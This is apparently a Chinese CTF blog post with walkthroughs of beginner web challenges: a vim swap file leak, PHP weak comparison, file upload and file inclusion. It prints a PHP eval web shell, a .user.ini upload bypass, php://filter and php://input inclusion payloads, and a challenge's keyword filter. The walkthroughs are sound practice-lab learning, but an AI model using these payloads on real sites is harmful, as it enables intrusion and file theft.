    <url>/2023/03/26/web01/</url>
    
    <content type="html"><![CDATA[<h2 id="先记一个学校CTF赛题"><a href="#先记一个学校CTF赛题" class="headerlink" title="先记一个学校CTF赛题"></a>先记一个学校CTF赛题</h2><h3 id="管理员错误使用了vim使得异常退出"><a href="#管理员错误使用了vim使得异常退出" class="headerlink" title="管理员错误使用了vim使得异常退出"></a>管理员错误使用了vim使得异常退出</h3><p><img src="vim%E5%BC%82%E5%B8%B8%E9%80%80%E5%87%BA.png" alt="vim异常退出"></p><p>根据vim的缓存原理，访问.index.php.swp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url：http://47.92.27.98:21655/.index.php.swp<br></code></pre></td></tr></table></figure><p><img src="index.php.swp.png" alt="index.php.swp"></p><p>访问url，下载缓存文件，记事本打开，ctrl+f “flag”  get~</p><hr><h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a><strong>攻防世界</strong></h2><h3 id="1-你知道index-php的备份文件名吗？"><a href="#1-你知道index-php的备份文件名吗？" class="headerlink" title="1.你知道index.php的备份文件名吗？"></a>1.你知道index.php的备份文件名吗？</h3><p>直接在url后加index.php.bak，下载备份文件，记事本打开</p><p>index.php.bak(backup备份)</p><hr><h3 id="2-一个不能按的按钮"><a href="#2-一个不能按的按钮" class="headerlink" title="2.一个不能按的按钮"></a>2.一个不能按的按钮</h3><p>F12看网页源码，发现button被禁用了，把disabled删掉</p><p><img src="button.png" alt="button"></p><hr><h3 id="3-sql-get"><a href="#3-sql-get" class="headerlink" title="3.sql(get)"></a>3.sql(get)</h3><p>明显的get注入，burp intruder模块1-10000爆破，得到2333，访问</p><p><img src="sql.png" alt="sql"></p><hr><h3 id="4-robots协议"><a href="#4-robots协议" class="headerlink" title="4.robots协议"></a>4.robots协议</h3><p>直接在url上访问robots.txt</p><p><img src="robots1.png" alt="robots1"></p><p>发现&#x2F;fl0g.php是不被允许的，直接访问</p><p><img src="robots2.png" alt="robots2"></p><hr><h3 id="5-PHP2"><a href="#5-PHP2" class="headerlink" title="5.PHP2"></a>5.PHP2</h3><p>进去显示你能认证这个网站吗，直接御剑扫后台，发现&#x2F;index.phps</p><p><img src="php2.1.png" alt="php2"></p><p>分析PHP代码，发现函数对传参进行了url解码，那我们需要对admin进行编码，由于浏览器本身会解码一次，所以我们编码两次，用burp编码模块，GET传参得到flag</p><p><img src="php2.2.png" alt="php2.2"></p><hr><h3 id="6-PHP"><a href="#6-PHP" class="headerlink" title="6.PHP"></a>6.PHP</h3><p>a和b都是get传参，a&#x3D;&#x3D;0是弱类型比较，值一样即可，无需类型相同，所以a随便传一个字符串如a&#x3D;’0’，a&#x3D;’0a’，flag1就得到了；b&gt;1234，但b不能是数字或者数字字符串，所以输b&#x3D;12345b，当’12345b’与 1234比较时，字符串先转换成数值12345， 再和1234比较12345&gt;1234，为真，输出flag2</p><p><img src="%E8%BF%98%E6%98%AFPHP.png" alt="还是PHP"></p><hr><h3 id="7-想想初始页面"><a href="#7-想想初始页面" class="headerlink" title="7.想想初始页面"></a>7.想想初始页面</h3><p>想到index.php，访问，F12查看一波</p><p><img src="index1.png" alt="index"></p><p>发现302跳转到location：1.php，说明index是存在的，burp重放模块</p><p><img src="index2.png" alt="index2"></p><p>说flag被隐藏了，但flag就藏在包里第五行<del>差点没看见&#x3D; &#x3D;</del></p><hr><h3 id="8-easyupload"><a href="#8-easyupload" class="headerlink" title="8.easyupload"></a>8.easyupload</h3><p>文件上传，php被拦，上传图片马，依然被拦，说明“php”很可能被检测出来，所以这里用短标签绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传成功但无法解析，想到分布式配置文件.htaccess，被拦，上传.user.ini以解析php，内容为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><br><span class="hljs-attribute">auto_prepend_file</span>=4.jpg<br></code></pre></td></tr></table></figure><p>Burp抓包，把Content-Type改成image&#x2F;jpg，绕过检测</p><p>然后上传图片马4.jpg，F12查看图片去向，蚁剑连接，打开flag文件。</p><p><img src="easyupload.png" alt="easyupload"></p><h4 id="关于-user-ini"><a href="#关于-user-ini" class="headerlink" title="关于.user.ini"></a>关于.user.ini</h4><p>.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p><p>这里就很清楚了，.user.ini实际上就是一个可以由用户“自定义”的php.ini</p><p>.user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如4.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(.&#x2F;4.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。</p><p>利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。</p><hr><h3 id="9-fileinclude"><a href="#9-fileinclude" class="headerlink" title="9.fileinclude"></a>9.fileinclude</h3><p>进入靶场，老规矩F12看一哈,发现有代码被注释了，格式不好看，所以查看页面源代码：</p><p><img src="fileinclude1.png" alt="fileinclude1"></p><p>关键在于15行，lan是存放着name为language的cookie的值的变量，当lan非零时将包含$lan.php，那任务就明确了，传一个</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Cookie: language=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag<br></code></pre></td></tr></table></figure><p>得到base64编码的一串字符</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">9</span>waHA<span class="hljs-symbol">NCiRmbGFnPSJjeWJlcnBlYWNlezU1</span><span class="hljs-symbol">NmNlYWExYWJmZWZmNzg0</span>Mjc<span class="hljs-number">2</span>Mz<span class="hljs-name">g5</span>ODRk<span class="hljs-symbol">NDUxOTMxfSI7</span>DQo/Pg==<br></code></pre></td></tr></table></figure><p>decode</p><p><img src="fileinclude2.png" alt="fileinclude2"></p><p>关于base64加密的原因，就是利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。（感谢‘zhangyuhaimian’——一个大黑阔）</p><h4 id="关于php-x2F-x2F-filter"><a href="#关于php-x2F-x2F-filter" class="headerlink" title="关于php:&#x2F;&#x2F;filter"></a>关于php:&#x2F;&#x2F;filter</h4><p>文章中还介绍了用base64解码绕过<?php exit; ?></p><p><a href="https://blog.csdn.net/weixin_44576725/article/details/124177555">php:&#x2F;&#x2F;filter的妙用</a></p><hr><h3 id="10-fileclude"><a href="#10-fileclude" class="headerlink" title="10.fileclude"></a>10.fileclude</h3><p>又是查看源代码</p><p><img src="fileclude1.png" alt="fileclude1"></p><p>发现有flag.php，如果file2的文件内容为hello ctf，则包含file1，那任务就明确了，把flag.php的内容base64加密写到file1里，然后往file2写入hello ctf</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file1=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</span><br></code></pre></td></tr></table></figure><p>然后burp抓包，post方式写入hello ctf</p><p><img src="fileclude2.png" alt="fileclude2"></p><p>再解密就行了。</p><p><a href="https://blog.csdn.net/weixin_44508748/article/details/108162951?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-108162951-blog-82461043.t5_download_comparev1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-108162951-blog-82461043.t5_download_comparev1&utm_relevant_index=4">漏洞梳理篇之php伪协议</a></p><hr><h3 id="11-file-include"><a href="#11-file-include" class="headerlink" title="11.file_include"></a>11.file_include</h3><p>经过前两道题的<del>沉淀</del>，我自认为我可以拿捏这道题了，我直接输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=check.php</span><br></code></pre></td></tr></table></figure><p>结果却是这样的：</p><p><img src="file_include1.png" alt="file_include1"></p><p>不得不说，<del>这个结果伤害了我</del>。</p><p>这里面应该有东西被过滤了，我在网上找到了别的绕过方法</p><p>使用其他的过滤器convert.iconv.* 绕过</p><p> 使用方法：convert.iconv.<input-encoding>.<output-encoding> 或者 convert.iconv.<input-encoding>&#x2F;<output-encoding></output-encoding></input-encoding></output-encoding></input-encoding></p><p>这里的<input-encoding>和<output-encoding>分别为输入的字符串编码方式和输出的字符串编码方式（字符集）。由于不知道哪种能成功，这里可以用burp爆破</output-encoding></input-encoding></p><p>这里直接给出能用的两个字符集UTF-8和UCS-2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/convert.iconv.UTF-8.UCS-2/resource=check.php</span><br></code></pre></td></tr></table></figure><p>页面多了一行代码，给出了过滤情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>])&#123; <span class="hljs-variable">$preg_match_username</span> = <span class="hljs-string">&#x27;return preg_match(&quot;/base|be|encode|print|zlib|quoted|write|rot13|read|string/i&quot;, $_GET[&quot;filename&quot;]);&#x27;</span>; <span class="hljs-keyword">if</span> (<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$preg_match_username</span>)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack!&quot;</span>);    &#125; &#125;<br></code></pre></td></tr></table></figure><p>盲猜flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/convert.iconv.UTF-8.UCS-2/resource=flag.php</span><br></code></pre></td></tr></table></figure><p><img src="file_include2.png" alt="file_include2"></p><hr><h3 id="12-unseping"><a href="#12-unseping" class="headerlink" title="12.unseping"></a>12.unseping</h3><p>贴脸开大，还是读代码</p><p><img src="unseping1.png" alt="unseping1"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>攻防世界</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
